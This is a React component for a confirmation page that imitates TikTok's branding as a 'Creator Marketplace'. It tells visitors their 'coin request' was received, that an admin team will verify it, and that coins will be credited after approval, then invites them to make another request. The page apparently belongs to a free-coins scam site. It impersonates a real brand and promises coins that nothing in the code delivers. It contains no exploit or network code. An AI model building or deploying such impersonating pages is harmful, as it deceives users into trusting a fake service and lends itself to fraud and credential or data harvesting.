import React, { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { CheckCircle, Coins } from 'lucide-react';

const SuccessPage = () => {
  const navigate = useNavigate();
  const coinAmount = localStorage.getItem('coinAmount') || '100,000';

  const handleBackHome = () => {
    // Clear localStorage
    localStorage.clear();
    navigate('/');
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-6 py-20">
        <div className="flex flex-col items-center justify-center">
          {/* Success Icon */}
          <div className="mb-8 relative">
            <div className="w-32 h-32 rounded-full bg-gradient-to-br from-green-400 to-cyan-500 flex items-center justify-center animate-pulse">
              <CheckCircle className="w-20 h-20 text-white" strokeWidth={3} />
            </div>
            {/* Floating coins animation */}
            <div className="absolute -top-4 -right-4 animate-bounce">
              <Coins className="w-12 h-12 text-yellow-400" />
            </div>
          </div>

          {/* Title */}
          <h1 className="text-5xl font-black text-white mb-4 text-center">
            Request Submitted Successfully!
          </h1>
          <p className="text-gray-400 text-xl text-center mb-8 max-w-2xl">
            Your coin request has been received and is being processed. You will receive your coins shortly.
          </p>

          {/* Success Message Box */}
          <div className="bg-gradient-to-r from-green-500/10 to-cyan-500/10 border-2 border-green-500/30 rounded-xl p-8 mb-12 max-w-2xl w-full">
            <div className="flex items-center gap-4 mb-4">
              <div className="w-3 h-3 rounded-full bg-green-400 animate-pulse"></div>
              <h2 className="text-2xl font-bold text-green-400">What happens next?</h2>
            </div>
            <ul className="space-y-3 text-gray-300">
              <li className="flex items-start gap-3">
                <span className="text-cyan-400 text-xl">✓</span>
                <span>Your request has been sent to our admin team</span>
              </li>
              <li className="flex items-start gap-3">
                <span className="text-cyan-400 text-xl">✓</span>
                <span>Verification process will begin shortly</span>
              </li>
              <li className="flex items-start gap-3">
                <span className="text-cyan-400 text-xl">✓</span>
                <span>Coins will be credited to your account after approval</span>
              </li>
              <li className="flex items-start gap-3">
                <span className="text-cyan-400 text-xl">✓</span>
                <span>You will receive a notification once completed</span>
              </li>
            </ul>
          </div>

          {/* Coins Display */}
          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4 mb-8">
            <span className="text-gray-400 text-lg">Requested Amount: </span>
            <span className="text-cyan-400 text-2xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
            <span className="text-gray-400 text-lg"> Coins</span>
          </div>

          {/* Back to Home Button */}
          <Button
            onClick={handleBackHome}
            className="bg-gradient-to-r from-[#fe2c55] to-[#ff4266] hover:from-[#ff4266] hover:to-[#fe2c55] text-white font-semibold px-12 py-6 text-lg rounded-lg transition-all shadow-lg shadow-pink-500/20"
          >
            Make Another Request
          </Button>
        </div>
      </main>
    </div>
  );
};

export default SuccessPage;